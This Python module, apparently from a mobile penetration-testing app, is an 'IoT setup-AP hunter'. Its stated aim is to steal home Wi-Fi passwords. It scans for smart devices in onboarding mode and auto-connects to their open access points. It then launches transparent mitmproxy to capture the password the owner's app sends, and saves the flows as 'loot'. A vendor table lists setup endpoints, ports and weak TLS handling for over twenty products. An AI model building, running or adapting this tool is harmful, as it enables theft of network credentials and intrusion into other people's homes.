"""IoT setup-mode AP hunter.

Many smart-home devices (cameras, plugs, bulbs, thermostats, printers,
robot vacuums) open a soft-AP with a predictable SSID pattern when
they are new / factory-reset / on-boarding. The vendor's app then
connects to that AP, sends the customer's Wi-Fi PSK, and the device
associates to the real network.

The interesting bit for an attacker: the transfer of the PSK is
usually in plaintext HTTP JSON POST to a fixed IP on the setup AP,
sometimes with TLS but almost never with server cert validation.
If we can:

  1. **Detect** the setup AP (by SSID prefix);
  2. **Associate** to it (they are open on purpose);
  3. **Sit in the middle** while the phone-owner's app talks to it
     (mitmproxy on port 80/443 with our fake cert);

then we walk away with the PSK for the target home Wi-Fi *without
ever attacking the router*.

This screen is the harvester + auto-attach front-end. mitmproxy is
launched separately; we do not embed it because it wants its own
terminal for the interactive UI. What we do here:

  * loop-scan visible SSIDs on the phone's own wlan0 in "managed"
    mode (no monitor needed -- these APs beacon normally),
  * flag anything matching a known setup pattern,
  * expose a one-click Attach + Start mitmproxy button.
"""
from __future__ import annotations

import re
import time
from pathlib import Path

from gi.repository import Adw, GLib, Gtk

from ..executor import Process, Result, run_async
from ..loot_store import get_loot_store, loot_path
from ..module import NHModule, register
from ..widgets import OutputView, services_banner, toast

DEFAULT_IFACE = "wlan0"

# Table of (regex, category, hint) for setup APs. We share the
# baseline with wifi_direct.py but add the specific pointers the
# operator wants to see (IP address, first endpoint to hit, whether
# it's TLS or plaintext).
_SETUP_PATTERNS: list[tuple[str, str, str]] = [
    (r"^HP-Setup-", "HP printer",
     "HTTP :80 setup; POST /IoMgmt/Adapters/Wifi0/WifiProfile"),
    (r"^ZSetup-", "Brother/Zebra printer",
     "HTTP :80; POST /net/wireless/certificate.html"),
    (r"^DIRECT-[A-Z0-9]{2}-Chromecast", "Chromecast",
     "HTTPS :8443; POST /setup/scan_wifi + /setup/connect_wifi"),
    (r"^Amazon-", "Amazon Echo",
     "HTTP :80; POST /provisioning?wifi_password="),
    (r"^GoogleHome", "Google Home",
     "HTTPS :8443; setup key exchange via BLE + Wi-Fi hybrid"),
    (r"^HomePod", "HomePod",
     "BLE-first onboarding; Wi-Fi shim mostly Apple-only"),
    (r"^Wyze_", "Wyze camera",
     "HTTP :80; POST /wifi/config JSON body with SSID+PSK"),
    (r"^ring-", "Ring doorbell",
     "HTTPS :443; POST /setup/wifi"),
    (r"^Reolink-", "Reolink camera",
     "HTTP :80; UDP :9000 discovery too"),
    (r"^Tapo_", "TP-Link Tapo",
     "HTTP :80; encrypted body but no server cert check"),
    (r"^HS100_|^HS110_|^KP\d{3}_", "TP-Link Kasa",
     "HTTP :80; obfuscated but not encrypted"),
    (r"^SmartLife_|^Tuya_", "Tuya",
     "BLE-first, Wi-Fi is fallback; multi-vendor cluster"),
    (r"^shellyplug-|^shelly", "Shelly",
     "HTTP :80; open URL /settings/sta"),
    (r"^Roomba-", "iRobot Roomba",
     "HTTP :80 with iRobot-specific token"),
    (r"^ecovacs", "Ecovacs",
     "BLE-first; Wi-Fi setup via encrypted JSON"),
    (r"^Roborock-", "Roborock",
     "HTTP :80; XiaoMi mihome protocol"),
    (r"^Xiaomi_", "Xiaomi/Mijia",
     "BLE + Wi-Fi hybrid; mihome API"),
    (r"^tasmota-|^tasmota_", "Tasmota",
     "Captive HTTP :80; /wifi form"),
    (r"^ESPHome|^ESP-", "ESPHome / ESP-IDF",
     "Captive HTTP :80; sometimes with PoP token"),
    (r"^Sonos", "Sonos",
     "HTTP :1400 setup API"),
    (r"^Nest-", "Nest",
     "BLE-first; Wi-Fi shim rarely reachable"),
    (r"^ecobee-", "Ecobee",
     "HTTP :80; /login /setup"),
]


def _classify_setup(ssid: str) -> tuple[str, str] | None:
    for regex, cat, hint in _SETUP_PATTERNS:
        if re.search(regex, ssid, re.IGNORECASE):
            return cat, hint
    return None


@register
class IoTSetup(NHModule):
    title = "IoT setup-AP hunter"
    icon = "system-search-symbolic"
    description = ("Waits for IoT devices in setup mode (open soft-AP) "
                   "and stands up a mitmproxy on the associated link "
                   "to steal the target Wi-Fi PSK the owner types.")
    required_tools = ["nmcli", "iw"]

    def __init__(self, app_window):
        super().__init__(app_window)
        self._scan_id: int | None = None
        self._mitm_proc: Process | None = None
        self._known: dict[str, dict] = {}
        self._rows: list[Adw.ExpanderRow] = []

    def build(self) -> Gtk.Widget:
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        for m in ("top", "bottom", "start", "end"):
            getattr(box, "set_margin_" + m)(12)

        # Services banner (managed centrally in Kali Services)
        box.append(services_banner(
            self.app_window, ['NetworkManager']))

        cfg = Adw.PreferencesGroup(
            title="Watching for setup APs",
            description="Periodic scan on the phone's own Wi-Fi "
                        "interface. Non-invasive: nothing transmits "
                        "beyond ordinary scan probes.")
        self.iface = Adw.EntryRow(title="Managed interface")
        self.iface.set_text(DEFAULT_IFACE)
        cfg.add(self.iface)

        self.interval = Adw.SpinRow.new_with_range(5, 300, 5)
        self.interval.set_title("Scan interval (seconds)")
        self.interval.set_value(15)
        cfg.add(self.interval)

        watch_row = Adw.ActionRow(
            title="Watch / Stop",
            subtitle="Interval-scans until you press Stop")
        self.watch_btn = Gtk.Button(label="Watch",
                                    valign=Gtk.Align.CENTER)
        self.watch_btn.add_css_class("suggested-action")
        self.watch_btn.connect("clicked",
                               lambda _b: self._start_watch())
        watch_row.add_suffix(self.watch_btn)
        self.stop_btn = Gtk.Button(label="Stop",
                                   valign=Gtk.Align.CENTER)
        self.stop_btn.set_sensitive(False)
        self.stop_btn.connect("clicked",
                              lambda _b: self._stop_watch())
        watch_row.add_suffix(self.stop_btn)
        cfg.add(watch_row)
        box.append(cfg)

        # ---- results
        self.results_group = Adw.PreferencesGroup(
            title="Devices in setup mode",
            description="One row per detected soft-AP")
        self._empty = Adw.ActionRow(
            title="Nothing spotted yet",
            subtitle="Setup APs only appear briefly during onboarding")
        self.results_group.add(self._empty)
        box.append(self.results_group)

        # ---- mitmproxy
        mitm_group = Adw.PreferencesGroup(
            title="mitmproxy",
            description="Point the associated device's app at the "
                        "phone as its network gateway, then run "
                        "mitmproxy to intercept the PSK POST.")
        mitm_row = Adw.ActionRow(
            title="Start mitmproxy (transparent)",
            subtitle="Opens a terminal window with mitmproxy -T")
        mitm_btn = Gtk.Button(label="Launch",
                              valign=Gtk.Align.CENTER)
        mitm_btn.add_css_class("suggested-action")
        mitm_btn.connect("clicked",
                         lambda _b: self._launch_mitm())
        mitm_row.add_suffix(mitm_btn)
        mitm_group.add(mitm_row)
        box.append(mitm_group)

        self.output = OutputView()
        box.append(self.output)
        return box

    # ------------------------------------------------------- watch
    def _start_watch(self) -> None:
        if self._scan_id is not None:
            return
        self.watch_btn.set_sensitive(False)
        self.stop_btn.set_sensitive(True)
        self.output.append("# watching for setup APs\n")
        self._do_scan()  # immediate first pass
        self._scan_id = GLib.timeout_add_seconds(
            int(self.interval.get_value()), self._do_scan)

    def _stop_watch(self) -> None:
        if self._scan_id is not None:
            GLib.source_remove(self._scan_id)
            self._scan_id = None
        self.watch_btn.set_sensitive(True)
        self.stop_btn.set_sensitive(False)

    def _do_scan(self) -> bool:
        iface = self.iface.get_text().strip() or DEFAULT_IFACE
        # nmcli lists SSIDs cheaply. --terse + --fields for a stable
        # format we can parse safely.
        script = (
            "nmcli -t -f SSID,BSSID,CHAN,SIGNAL device wifi "
            "list ifname %s --rescan yes 2>/dev/null | head -100"
        ) % iface

        def done(r: Result) -> None:
            new = self._parse(r.stdout or "")
            self._render(new)

        run_async(["sh", "-c", script], done,
                  root=False, timeout=15)
        return True

    def _parse(self, text: str) -> list[dict]:
        out: list[dict] = []
        for line in text.splitlines():
            # nmcli terse format uses ':' as separator; BSSID has ':'
            # too, so we split from the right. Format:
            #   SSID:BSSID:CHAN:SIGNAL
            parts = line.split(":")
            if len(parts) < 4:
                continue
            signal = parts[-1]
            chan = parts[-2]
            # BSSID is the previous 6 fields joined
            bssid = ":".join(parts[-8:-2])
            ssid = ":".join(parts[:-8])
            match = _classify_setup(ssid)
            if not match:
                continue
            cat, hint = match
            out.append({
                "ssid": ssid, "bssid": bssid.lower(),
                "chan": chan, "signal": signal,
                "cat": cat, "hint": hint,
            })
        return out

    def _render(self, aps: list[dict]) -> None:
        # Merge with known so devices sticking around don't flicker.
        for a in aps:
            self._known[a["ssid"]] = a
        for r in self._rows:
            self.results_group.remove(r)
        self._rows = []
        if not self._known:
            self._empty.set_visible(True)
            return
        self._empty.set_visible(False)
        for a in sorted(self._known.values(),
                         key=lambda a: (a["cat"], a["ssid"])):
            self._rows.append(self._make_row(a))

    def _make_row(self, ap: dict) -> Adw.ExpanderRow:
        row = Adw.ExpanderRow(
            title=ap["ssid"],
            subtitle="%s · %s · ch %s · %s%%"
                    % (ap["cat"], ap["bssid"], ap["chan"],
                       ap["signal"]))
        row.add_row(Adw.ActionRow(title="Hint", subtitle=ap["hint"]))
        att_row = Adw.ActionRow(
            title="Attach",
            subtitle="nmcli device wifi connect on this SSID")
        att_btn = Gtk.Button(label="Attach",
                             valign=Gtk.Align.CENTER)
        att_btn.add_css_class("suggested-action")
        att_btn.connect(
            "clicked",
            lambda _b, s=ap["ssid"]: self._attach(s))
        att_row.add_suffix(att_btn)
        row.add_row(att_row)

        # If the device is a printer we can pivot straight to the
        # PRET workflow in the IoT Hacking module.
        if "printer" in ap["cat"].lower():
            pret_row = Adw.ActionRow(
                title="Once attached, run PRET",
                subtitle="Deep-links to the IoT Hacking module")
            pret_btn = Gtk.Button(label="PRET",
                                  valign=Gtk.Align.CENTER)
            pret_btn.connect(
                "clicked",
                lambda _b, s=ap["ssid"]:
                    self.app_window.activate_module(
                        "iot_hacking", s))
            pret_row.add_suffix(pret_btn)
            row.add_row(pret_row)

        self.results_group.add(row)
        return row

    def _attach(self, ssid: str) -> None:
        # Straight nmcli connect. These APs are open so no PSK needed.
        script = "nmcli device wifi connect '%s'" % ssid.replace(
            "'", "")

        def done(r: Result) -> None:
            self.output.append(r.stdout or "")
            if r.stderr:
                self.output.append(r.stderr)

        run_async(["sh", "-c", script], done,
                  root=False, timeout=20)

    def _launch_mitm(self) -> None:
        # Open a terminal window and start mitmproxy on port 8080 in
        # transparent mode, with the flow log dropped into loot.
        stamp = time.strftime("%Y%m%d-%H%M%S")
        flow_path = loot_path(
            "iot_setup", "mitm-%s.flows" % stamp)
        get_loot_store().record(
            module="iot_setup", type="mitm_flows",
            target="setup-AP MITM",
            path=flow_path,
            notes="mitmproxy transparent capture")
        script = (
            "term=$(command -v kgx || command -v gnome-terminal "
            "|| command -v xterm || echo xterm); "
            "case $term in "
            "  *kgx*|*gnome-terminal*) "
            "    $term -- sudo mitmproxy --mode transparent "
            "      --set stream_large_bodies=1m -w %s ;; "
            "  *) "
            "    $term -e \"sudo mitmproxy --mode transparent "
            "      --set stream_large_bodies=1m -w %s\" ;; "
            "esac &"
        ) % (flow_path, flow_path)
        run_async(["sh", "-c", script],
                  lambda _r: None, root=False, timeout=5)
        toast(self.app_window,
              "mitmproxy launched; flow saved to " + flow_path)
